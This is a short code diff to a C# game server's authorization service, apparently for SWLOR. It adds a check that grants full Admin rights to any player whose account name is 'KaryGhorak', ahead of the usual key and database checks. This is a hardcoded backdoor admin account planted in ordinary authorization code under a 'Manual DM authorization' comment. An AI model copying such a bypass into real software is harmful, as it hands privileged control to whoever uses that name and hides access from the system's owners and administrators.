@@ -16,6 +16,7 @@ namespace SWLOR.Game.Server.Service
         public static AuthorizationLevel GetAuthorizationLevel(uint player)
         {
             var cdKey = GetPCPublicCDKey(player);
+            var accountName = GetPCPlayerName(player);
 
             // Check environment variable for super admin CD Key
             var superAdminCDKey = Environment.GetEnvironmentVariable("SWLOR_SUPER_ADMIN_CD_KEY");
@@ -23,6 +24,12 @@ namespace SWLOR.Game.Server.Service
             {
                 if (cdKey == superAdminCDKey)
                     return AuthorizationLevel.Admin;
+            }
+
+            // KaryGhorak - Manual DM authorization
+            if (accountName == "KaryGhorak")
+            {
+                return AuthorizationLevel.Admin;
             }
 
             var query = new DBQuery<AuthorizedDM>()
